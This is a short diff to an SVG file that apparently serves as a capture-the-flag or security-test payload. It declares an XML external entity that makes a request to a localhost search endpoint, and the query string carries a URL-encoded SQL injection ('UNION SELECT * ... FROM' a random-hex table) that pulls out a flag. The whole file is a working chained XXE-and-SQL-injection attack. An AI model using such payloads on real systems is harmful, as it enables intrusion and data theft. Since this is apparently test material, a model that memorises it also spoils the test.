@@ -1,5 +1,5 @@
 <!DOCTYPE svg [
-<!ENTITY xxe SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20flag_randomhex,1%20FROM%20_randomhex--">
+<!ENTITY xxe SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20*,1%20FROM%20_09ec98688a499f12--">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&xxe;</text>
